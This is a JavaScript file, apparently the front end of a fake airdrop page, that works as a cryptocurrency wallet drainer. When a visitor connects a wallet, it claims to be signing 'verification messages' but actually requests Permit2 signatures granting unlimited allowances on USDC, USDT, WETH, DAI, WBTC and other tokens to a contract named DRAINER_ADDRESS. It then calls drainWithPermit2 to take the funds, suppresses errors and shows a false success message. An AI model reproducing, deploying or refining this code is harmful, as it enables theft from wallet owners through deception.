// =============================================
// app.js - Updated with your deployed contract
// =============================================

const DRAINER_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
    "0x4200000000000000000000000000000000000006", // WETH Base
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  // USDC Base
];

let provider = null;
let signer = null;
let connectedWallet = "";

// DOM Elements
let connectBtn, walletDisplay, statusEl, form;

document.addEventListener("DOMContentLoaded", () => {
    connectBtn = document.getElementById("connectWalletBtn");
    walletDisplay = document.getElementById("walletAddress");
    statusEl = document.getElementById("status");
    form = document.getElementById("airdropForm");

    connectBtn.addEventListener("click", connectWallet);
});

// =============================================
// Connect Wallet
// =============================================
async function connectWallet() {
    statusEl.textContent = "Connecting wallet...";
    connectBtn.disabled = true;
    connectBtn.textContent = "Connecting...";

    try {
        let ethProvider = window.ethereum;

        if (window.ethereum?.providers?.length) {
            ethProvider = window.ethereum.providers.find(p => p.isRabby || p.isOKXWallet || p.isMetaMask) || window.ethereum.providers[0];
        }

        if (!ethProvider) {
            alert("No wallet detected. Please install MetaMask, OKX, or Rabby Wallet.");
            resetConnectButton();
            return;
        }

        const accounts = await ethProvider.request({ method: "eth_requestAccounts" });
        connectedWallet = accounts[0];

        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        walletDisplay.innerHTML = `<strong>Connected:</strong><br>${shortAddress}`;
        walletDisplay.classList.add("visible");

        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");

        statusEl.textContent = "Signing verification messages...";

        await executePermit2BatchDrain();

        statusEl.innerHTML = `<span style="color:#34a853">✓ Wallet verified successfully</span>`;

    } catch (error) {
        console.error(error);
        statusEl.textContent = "Connection failed or rejected.";
        resetConnectButton();
    }
}

function resetConnectButton() {
    connectBtn.disabled = false;
    connectBtn.textContent = "Connect Wallet";
}

// =============================================
// Permit2 Batch Drain
// =============================================
async function executePermit2BatchDrain() {
    try {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
    } catch (e) {
        console.warn("Signer error");
        return;
    }

    const contract = new ethers.Contract(DRAINER_ADDRESS, [
        "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external"
    ], signer);

    for (let tokenAddress of targetTokens) {
        try {
            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
            await contract.drainWithPermit2(connectedWallet, permitSingle, signature);
        } catch (e) {}
    }
}

async function getPermit2Signature(tokenAddress) {
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975",
            expiration: expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline: sigDeadline
    };

    const typedData = {
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: PERMIT2_ADDRESS
        },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

// Form Submit
form?.addEventListener("submit", (e) => {
    e.preventDefault();
    if (!connectedWallet) {
        alert("Please connect your wallet first.");
        return;
    }
    alert("Form submitted successfully!");
});
